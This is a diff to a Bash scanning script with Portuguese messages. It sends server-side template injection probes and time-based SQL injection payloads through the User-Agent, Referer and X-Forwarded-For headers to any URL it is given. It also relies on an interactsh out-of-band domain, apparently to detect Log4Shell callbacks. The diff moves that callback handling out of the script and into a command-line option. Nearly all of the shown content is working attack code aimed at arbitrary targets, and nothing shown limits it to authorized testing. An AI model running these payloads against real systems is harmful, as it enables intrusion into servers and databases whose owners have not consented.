@@ -1,21 +1,26 @@
 #!/bin/bash
 TARGET=$1
+IACT_DOMAIN=""
+
+# Captura -i da linha de comando
+while [[ "$#" -gt 0 ]]; do
+  case $1 in
+    -i) IACT_DOMAIN="$2"; shift ;;
+    http*) TARGET="$1" ;;
+  esac
+  shift
+done
+
 HOST=$(echo $TARGET | sed 's|https\?://||' | cut -d'/' -f1)
 
-echo "[*] Iniciando interactsh-client..."
-interactsh-client -o /tmp/interactsh_output.txt &
-IACT_PID=$!
-sleep 8
-
-IACT_DOMAIN=$(grep -oE '[a-z0-9]+\.oast\.[a-z]+' /tmp/interactsh_full.txt | head -1)
-
 if [ -z "$IACT_DOMAIN" ]; then
-  echo "[!] Falha ao capturar domínio interactsh"
-  kill $IACT_PID 2>/dev/null
+  echo "[!] Informe o domínio interactsh com -i"
+  echo "Uso: bash testes_headers.sh https://alvo -i SEU-DOMINIO.oast.site"
   exit 1
 fi
 
 echo "[*] Domínio interactsh: $IACT_DOMAIN"
+echo "[*] Target: $TARGET"
 
 scan_target() {
   local url=$1
@@ -84,7 +89,6 @@ scan_target() {
 
   for payload in '{{7*7}}' '${7*7}' '*{7*7}' '#{7*7}' '<%= 7*7 %>'; do
     engine=${ENGINE_MAP[$payload]}
-
     for h in "User-Agent" "Referer" "X-Forwarded-For"; do
       result=$(curl $CURL_FLAGS --max-time 5 \
         -H "$h: $payload" "$url")
@@ -100,12 +104,12 @@ scan_target() {
   echo ""
   echo "=== XFF SQLi (time-based) ==="
   for payload in "'" "' OR 1=1--" "1; SELECT SLEEP(5)--" "1 AND SLEEP(5)--"; do
-    time=$(curl $CURL_FLAGS -o /dev/null -w "%{time_total}" --max-time 10 \
+    elapsed=$(curl $CURL_FLAGS -o /dev/null -w "%{time_total}" --max-time 10 \
       -H "X-Forwarded-For: $payload" "$url")
-    if (( $(echo "$time > 4" | bc -l) )); then
-      echo "[POSSIBLE SQLi] ${time}s → $payload"
+    if (( $(echo "$elapsed > 4" | bc -l) )); then
+      echo "[POSSIBLE SQLi] ${elapsed}s → $payload"
     else
-      echo "[${time}s] $payload"
+      echo "[${elapsed}s] $payload"
     fi
   done
 }
@@ -114,25 +118,6 @@ scan_target() {
 scan_target "http://$HOST" "HTTP"
 scan_target "https://$HOST" "HTTPS"
 
-# Aguarda callbacks
-echo ""
-echo "[*] Aguardando callbacks DNS por 20s..."
-sleep 20
-
-echo ""
-echo "=== Callbacks recebidos ==="
-if grep -qE "(DNS|HTTP|SMTP)" /tmp/interactsh_output.txt; then
-  grep -E "(DNS|HTTP|SMTP)" /tmp/interactsh_output.txt | while read line; do
-    echo "[CALLBACK] $line"
-  done
-  echo ""
-  echo "[!!!] Log4Shell CONFIRMADO — callback recebido"
-else
-  echo "[*] Nenhum callback recebido"
-fi
-
-kill $IACT_PID 2>/dev/null
-rm -f /tmp/interactsh_output.txt
-
 echo ""
 echo "[*] Scan finalizado → $HOST"
+echo "[*] Verifique callbacks no interactsh-client"
